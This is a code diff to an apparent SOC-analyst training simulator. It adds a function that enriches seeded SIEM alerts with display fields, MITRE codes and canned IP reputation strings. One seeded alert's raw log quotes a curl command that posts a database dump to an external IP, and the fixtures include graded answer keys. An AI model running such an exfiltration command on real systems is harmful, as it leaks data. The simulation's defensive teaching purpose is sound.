@@ -736,6 +736,135 @@ def seed_accountant(cfg):
     ])
     _seed_accountant_artifacts(cfg)
 
+# ── SOC alert enrichment (realism upgrade) ────────────────────────
+# Derives professional SOC-grade fields from the base alert schema at seed
+# time. Purely additive: existing fields (severity, status, mitre_tactic,
+# mitre_technique) are kept verbatim because scoring, CSS classes, and the
+# day-pack filters key off them; the upgraded display variants get new names
+# (severity_label, status_label, mitre_tactic_full, mitre_technique_full).
+
+_SOC_TA_CODES = {
+    "Reconnaissance": "TA0043", "Resource Development": "TA0042",
+    "Initial Access": "TA0001", "Execution": "TA0002", "Persistence": "TA0003",
+    "Privilege Escalation": "TA0004", "Defense Evasion": "TA0005",
+    "Credential Access": "TA0006", "Discovery": "TA0007",
+    "Lateral Movement": "TA0008", "Collection": "TA0009",
+    "Exfiltration": "TA0010", "Command and Control": "TA0011", "Impact": "TA0040",
+}
+
+_SOC_RULE_NAMES = {
+    "brute_force":        "Multiple Failed Logons Followed by Success (Possible Brute Force)",
+    "data_exfiltration":  "Abnormal Outbound Data Volume to Untrusted External Host",
+    "credential_access":  "Service Account Logon Outside Credential Rotation Policy",
+    "phishing":           "Mass Inbound Campaign with Credential-Harvesting URL",
+    "malware":            "Known Malware Hash Detected on Endpoint (Threat Intel Match)",
+    "ambiguous":          "Anomalous Process/Query Behaviour Requiring Analyst Review",
+    "false_positive_travel": "Impossible-Travel Logon Outside Baseline Geography",
+}
+
+# Curated threat-intel strings for day-1 external source IPs.
+_SOC_IP_REPUTATION = {
+    "185.234.72.19": "AbuseIPDB: 97% malicious confidence, RO — 214 reports (data exfil, C2)",
+    "203.0.113.42":  "AbuseIPDB: 100% malicious confidence, NL — known Tor exit node",
+    "45.62.118.203": "AbuseIPDB: 89% malicious confidence, US — domain registered 4 days ago",
+    "41.58.12.90":   "AbuseIPDB: 0% — no reports. Nigerian residential ISP (MTN)",
+}
+
+_RFC1918_RE = re.compile(r"^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)")
+
+def _enrich_soc_alert(a: dict) -> dict:
+    """Return a copy of alert `a` with SOC-grade presentation fields added.
+    Idempotent — skips anything already present. Deterministic — same input
+    always produces the same output (detection delay is hashed from id)."""
+    out = dict(a)
+    aid = str(out.get("id") or "")
+    h = int(hashlib.md5(aid.encode()).hexdigest(), 16)
+
+    # alert_id — SOC-2026-XXXX from the trailing digits of the legacy id.
+    if "alert_id" not in out:
+        m = re.search(r"(\d+)$", aid)
+        out["alert_id"] = f"SOC-2026-{int(m.group(1)) if m else h % 10000:04d}"
+
+    # rule_name — curated per threat_type; falls back to a rule-ified title.
+    if "rule_name" not in out:
+        out["rule_name"] = _SOC_RULE_NAMES.get(out.get("threat_type") or "", out.get("title") or "Unclassified Detection Rule")
+
+    # severity_label / status_label — display variants (legacy fields untouched).
+    sev = str(out.get("severity") or "LOW").upper()
+    out.setdefault("severity_label", sev.title())          # CRITICAL → Critical
+    st = str(out.get("triage_status") or "").lower()
+    out.setdefault("status_label",
+                   "Closed" if out.get("status") in ("resolved", "closed") else
+                   ("In Progress" if st in ("investigating", "in_progress") else "New"))
+
+    # verdict — null until the analyst rules on it.
+    out.setdefault("verdict", None)
+
+    # event_time / detection_time — detection lags the event 7–180 s (hash-seeded).
+    ts = out.get("timestamp")
+    if ts and "event_time" not in out:
+        out["event_time"] = ts
+        try:
+            dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
+            out["detection_time"] = (dt + timedelta(seconds=7 + h % 173)).strftime("%Y-%m-%dT%H:%M:%SZ")
+        except Exception:
+            out["detection_time"] = ts
+
+    # source_ip / dest_ip — straight aliases of the legacy names.
+    out.setdefault("source_ip", out.get("src_ip") or "-")
+    out.setdefault("dest_ip", out.get("dst_ip") or "-")
+
+    # hostname — the internal asset in play: src_host when the source is
+    # internal (RFC1918), otherwise fall back through affected_asset/dst.
+    if "hostname" not in out:
+        src_ip, src_host = str(out.get("src_ip") or ""), out.get("src_host") or ""
+        if _RFC1918_RE.match(src_ip) and src_host and not src_host.startswith("("):
+            out["hostname"] = src_host
+        else:
+            asset = out.get("affected_asset") or ""
+            m = re.search(r"\b([A-Z][A-Z0-9]*(?:-[A-Z0-9]+)+)\b", asset)
+            out["hostname"] = m.group(1) if m else (asset or src_host or "-")
+
+    out.setdefault("affected_user", out.get("src_user") or "-")
+
+    # log_source — "CrowdStrike Falcon (EDR)" style.
+    if "log_source" not in out:
+        det, src = out.get("source_detail") or "", out.get("source") or ""
+        out["log_source"] = f"{det} ({src})" if det and src and det != src else (det or src or "-")
+
+    out.setdefault("trigger_reason", out.get("description") or out.get("details") or "-")
+
+    # MITRE display variants — "TA0006 Credential Access" / "T1110.001 Password Guessing".
+    tac = out.get("mitre_tactic") or ""
+    if "mitre_tactic_full" not in out:
+        code = _SOC_TA_CODES.get(tac)
+        out["mitre_tactic_full"] = f"{code} {tac}" if code else (tac if tac and tac != "-" else "-")
+    tech, tname = out.get("mitre_technique") or "", out.get("mitre_name") or ""
+    if "mitre_technique_full" not in out:
+        out["mitre_technique_full"] = f"{tech} {tname}".strip() if tech and tech != "-" else "-"
+
+    # device_action — inferred from the raw log / source kind.
+    if "device_action" not in out:
+        raw = (out.get("raw_log") or "").lower()
+        if "quarantine" in raw:
+            out["device_action"] = "Quarantined"
+        elif any(w in raw for w in ("blocked", "deny", "denied", "drop")):
+            out["device_action"] = "Blocked"
+        else:
+            out["device_action"] = "Allowed"
+
+    # ip_reputation — curated intel for known day-1 IPs, else derive.
+    if "ip_reputation" not in out:
+        src_ip = str(out.get("src_ip") or "")
+        if src_ip in _SOC_IP_REPUTATION:
+            out["ip_reputation"] = _SOC_IP_REPUTATION[src_ip]
+        elif _RFC1918_RE.match(src_ip):
+            out["ip_reputation"] = "Internal address — reputation N/A"
+        else:
+            out["ip_reputation"] = out.get("dst_reputation") or "No threat intel match"
+
+    return out
+
 def seed_cybersecurity(cfg):
     emails_col.insert_many([
         {"id":"e1","simulation_id":sim_id(),"from_name":cfg["manager"]["name"],"from_role":cfg["manager"]["role"],"from_email":cfg["manager"]["email"],"to":"you","subject":"Welcome to the SOC — first shift briefing","body":f"Welcome to {cfg['company']}. You're on the morning shift. Check the SIEM dashboard — there are alerts from overnight that need triaging. Flag anything suspicious as HIGH and escalate to me. False positives mark as RESOLVED.\n\nWe have a standup at 11am — bring your triage summary.\n\n{cfg['manager']['name']}","time":"08:00","read":False,"replied":False,"priority":"high","category":"task","requires_action":True},
@@ -759,7 +888,7 @@ def seed_cybersecurity(cfg):
         {"id":"t9","simulation_id":sim_id(),"title":"Draft your section of the weekly threat report","description":"Director wants top alerts, phishing summary, open incidents. Due Thursday EOD.","priority":"medium","deadline":"Thursday","status":"pending","points":15},
     ])
     _sim = sim_id()
-    siem_col.insert_many([
+    siem_col.insert_many([_enrich_soc_alert(a) for a in [
         {"id":"ALERT-2026-0218-001","simulation_id":_sim,"timestamp":"2026-02-18T02:17:33Z","severity":"CRITICAL","confidence":92,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"Large outbound data transfer to unregistered IP","description":"14.2 GB transferred via HTTPS to external IP over 2-hour window during non-business hours.","details":"14.2 GB transferred via HTTPS to external IP over 2-hour window during non-business hours.","src_ip":"10.0.4.22","src_host":"PROD-DB-01","src_user":"svc_backup","dst_ip":"185.234.72.19","dst_geo":"Bucharest, Romania","dst_reputation":"Unregistered — no threat intel match","affected_asset":"Production Database Server (PostgreSQL)","mitre_tactic":"Exfiltration","mitre_technique":"T1048.001","mitre_name":"Exfiltration Over Alternative Protocol: HTTPS","status":"open","triage_status":"unreviewed","sla_hours":1,"is_real_threat":True,"threat_type":"data_exfiltration","correct_action":"escalate","points":20,"related_alerts":["ALERT-2026-0218-003"],"playbook":"IR-EXFIL-001: Data Exfiltration Response","playbook_steps":["Isolate affected host from network immediately","Capture memory dump and disk image","Check svc_backup credentials — when was last password rotation?","Review firewall logs for dst IP 185.234.72.19 — any prior connections?","Notify CISO and initiate P1 incident bridge","Check if data contained PII — if yes, trigger breach notification process"],"raw_log":"Feb 18 02:17:33 PROD-DB-01 crowdstrike[4821]: ALERT severity=critical src=10.0.4.22 dst=185.234.72.19 proto=https bytes_out=14248103936 duration=7234s user=svc_backup process=/usr/bin/curl cmd=\"curl -X POST https://185.234.72.19/upload -d @/tmp/dump_20260218.tar.gz\"","analyst_notes":"","false_positive_indicators":None},
         {"id":"ALERT-2026-0218-002","simulation_id":_sim,"timestamp":"2026-02-18T01:45:12Z","severity":"HIGH","confidence":85,"source":"EDR","source_detail":"CrowdStrike Falcon","title":"SSH brute force followed by successful logins","description":"847 failed SSH attempts in 12 minutes followed by 3 successful logins — account likely compromised.","details":"847 failed SSH attempts in 12 minutes against admin/root/deploy. 3 successful logins followed.","src_ip":"203.0.113.42","src_host":"(external — Tor exit, Amsterdam)","src_user":"admin/root/deploy","dst_ip":"10.0.2.18","dst_geo":"London, UK (internal)","dst_reputation":"Known Tor exit node","affected_asset":"STAGING-WEB-02","mitre_tactic":"Credential Access","mitre_technique":"T1110.001","mitre_name":"Brute Force: Password Guessing","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"brute_force","correct_action":"escalate","points":15,"related_alerts":[],"playbook":"IR-CRED-002: Brute Force / Account Compromise","playbook_steps":["Disable affected accounts immediately","Force password reset for admin/root/deploy","Block source IP at firewall","Review login audit log for last 24h","Check for lateral movement from staging-web-02"],"raw_log":"Feb 18 01:45:12 STAGING-WEB-02 sshd[2181]: Failed password for admin from 203.0.113.42 port 51224 ssh2 (847 attempts in window) — followed by Accepted password for admin from 203.0.113.42","analyst_notes":"","false_positive_indicators":None},
         {"id":"ALERT-2026-0218-003","simulation_id":_sim,"timestamp":"2026-02-18T01:58:04Z","severity":"HIGH","confidence":78,"source":"SIEM","source_detail":"SIEM Correlation Engine","title":"Service account login with stale credentials","description":"svc_backup logged into PROD-DB-01 — credentials last rotated 387 days ago (policy: 90).","details":"Successful login to PROD-DB-01 from 10.0.4.22 by svc_backup. Credential rotation overdue by 297 days.","src_ip":"10.0.4.22","src_host":"PROD-DB-01","src_user":"svc_backup","dst_ip":"10.0.4.22","dst_geo":"London, UK (internal)","dst_reputation":"Internal","affected_asset":"Production Database Server (PostgreSQL)","mitre_tactic":"Initial Access","mitre_technique":"T1078.001","mitre_name":"Valid Accounts: Default Accounts","status":"open","triage_status":"unreviewed","sla_hours":2,"is_real_threat":True,"threat_type":"credential_access","correct_action":"escalate","points":15,"related_alerts":["ALERT-2026-0218-001"],"playbook":"IR-CRED-003: Stale Service Account Login","playbook_steps":["Review last 30d activity for svc_backup","Rotate svc_backup credentials","Confirm whether the login preceded the data exfil event","Cross-check with ALERT-2026-0218-001"],"raw_log":"Feb 18 01:58:04 PROD-DB-01 auth[331]: session opened for user svc_backup by (uid=0); cred_age_days=387; policy_max=90","analyst_notes":"","false_positive_indicators":None},
@@ -775,7 +904,7 @@ def seed_cybersecurity(cfg):
         {"id":"ALERT-2026-0218-013","simulation_id":_sim,"timestamp":"2026-02-18T08:45:33Z","severity":"MEDIUM","confidence":20,"source":"Web Proxy","source_detail":"Zscaler","title":"TLS certificate mismatch on internal portal","description":"Cert expired 2 days ago — IT ticket INC-4521 already open.","details":"portal.company.com cert expired 2026-02-16. INC-4521 in progress.","src_ip":"-","src_host":"portal.company.com","src_user":"-","dst_ip":"10.0.10.50","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"portal.company.com","mitre_tactic":"-","mitre_technique":"-","mitre_name":"-","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-CERT: Known Cert Issue","playbook_steps":["Confirm INC-4521 is open","Mark resolved"],"raw_log":"Feb 18 08:45:33 zscaler tls_alert host=portal.company.com cert_status=expired expiry=2026-02-16 ticket=INC-4521","analyst_notes":"","false_positive_indicators":"Known cert expiry — IT working on renewal INC-4521"},
         {"id":"ALERT-2026-0218-014","simulation_id":_sim,"timestamp":"2026-02-18T09:01:12Z","severity":"LOW","confidence":8,"source":"IAM","source_detail":"Azure Active Directory","title":"3 failed logins followed by success (likely typo)","description":"Normal fat-finger pattern — same user, same workstation, success on 4th attempt.","details":"m.johnson@company.com — 3 failed, then success. WS-SALES-03.","src_ip":"10.0.2.44","src_host":"WS-SALES-03","src_user":"m.johnson","dst_ip":"login.microsoftonline.com","dst_geo":"London, UK","dst_reputation":"-","affected_asset":"Azure AD","mitre_tactic":"Credential Access","mitre_technique":"T1110.001","mitre_name":"Brute Force: Password Guessing","status":"open","triage_status":"unreviewed","sla_hours":8,"is_real_threat":False,"threat_type":"false_positive","correct_action":"resolve","points":5,"related_alerts":[],"playbook":"IR-FP-LOGIN: Typo Pattern","playbook_steps":["Review login window","Mark resolved"],"raw_log":"Feb 18 09:01:12 AzureAD signin user=m.johnson failures=3 success=1 ip=10.0.2.44 device=WS-SALES-03","analyst_notes":"","false_positive_indicators":"User mistyped password — successful on 4th attempt, normal pattern"},
         {"id":"ALERT-2026-0218-015","simulation_id":_sim,"timestamp":"2026-02-18T08:30:44Z","severity":"MEDIUM","confidence":50,"source":"DAM","source_detail":"Imperva Database Activity Monitor","title":"Anomalous large customer SELECT","description":"SELECT * FROM customers WHERE region='ALL' returned 45,000 rows. Could be batch job — or harvesting.","details":"app-server-02 (svc_api) executed SELECT * FROM customers WHERE region='ALL' — 45,000 rows. No matching scheduled job logged.","src_ip":"10.0.6.20","src_host":"APP-SERVER-02","src_user":"svc_api","dst_ip":"10.0.4.22","dst_geo":"Internal","dst_reputation":"Internal","affected_asset":"PROD-DB-01 (customers table)","mitre_tactic":"Collection","mitre_technique":"T1213","mitre_name":"Data from Information Repositories","status":"open","triage_status":"unreviewed","sla_hours":4,"is_real_threat":None,"threat_type":"ambiguous","correct_action":"investigate","points":10,"related_alerts":[],"playbook":"IR-INV-DAM: Anomalous Query","playbook_steps":["Cross-check scheduled batch job calendar","Inspect svc_api recent process tree","Confirm with data team whether the export was sanctioned"],"raw_log":"Feb 18 08:30:44 imperva dam src=APP-SERVER-02 user=svc_api db=customers query=\"SELECT * FROM customers WHERE region='ALL'\" rows=45000 anomaly_score=0.72","analyst_notes":"","false_positive_indicators":None},
-    ])
+    ]])
     _seed_cybersecurity_siem_only()
 
 def _seed_cybersecurity_siem_only():
@@ -3977,7 +4106,7 @@ async def api_advance_day():
     _sim = sim_id()
     # Cyber-specific SIEM alerts (legacy pack still drives the SIEM tab).
     if career == "cybersecurity":
-        revealed += _insert_day_pack(_CYBER_DAY_PACKS.get(nxt) or [], siem_col, nxt, _sim)
+        revealed += _insert_day_pack([_enrich_soc_alert(a) for a in (_CYBER_DAY_PACKS.get(nxt) or [])], siem_col, nxt, _sim)
     # Unified pack: emails/tasks/invoices/jira/campaigns for all careers.
     day_pack = (_DAY_PACKS.get(career) or {}).get(nxt) or {}
     for sub_key, col in _DAY_PACK_COLS.items():
@@ -4027,7 +4156,7 @@ async def api_next_day():
     nxt = cur + 1
     revealed = 0
     if career == "cybersecurity":
-        revealed += _insert_day_pack(_CYBER_DAY_PACKS.get(nxt) or [], siem_col, nxt, _sim)
+        revealed += _insert_day_pack([_enrich_soc_alert(a) for a in (_CYBER_DAY_PACKS.get(nxt) or [])], siem_col, nxt, _sim)
     day_pack = (_DAY_PACKS.get(career) or {}).get(nxt) or {}
     for sub_key, col in _DAY_PACK_COLS.items():
         revealed += _insert_day_pack(day_pack.get(sub_key) or [], col, nxt, _sim)
